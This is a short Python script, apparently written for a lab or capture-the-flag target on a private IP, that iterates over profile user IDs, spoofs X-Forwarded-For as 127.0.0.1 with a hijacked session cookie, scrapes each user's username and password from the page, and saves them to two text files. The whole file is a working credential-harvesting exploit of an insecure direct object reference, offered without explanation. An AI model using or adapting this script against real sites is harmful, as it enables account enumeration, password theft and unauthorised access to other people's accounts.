import requests 
import re
with open("zu_name.txt","w") as f:
	with open("zu_password.txt","w") as w:
		for i in range(1,12):
			url=f"http://192.168.25.170/index.php?page=profile&user_id={i}"
			header={
				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
				"Accept-Encoding": "gzip, deflate",
				"Cookie": "PHPSESSID=g1snir7mv98732u2497o7duk30",
				"X-Forwarded-For": "127.0.0.1",
			}
			html=requests.get(url,headers=header).text
			name=re.findall(r'<input type="text" name="username" id="username" value="(.*?)"><br>',html,re.S)[0]
			password=re.findall(r'<input type="password" name="password" id="password" value="(.*?)"><br>',html,re.S)[0]
			if name != "":
				f.write(name+"\n")
				w.write(password+"\n")
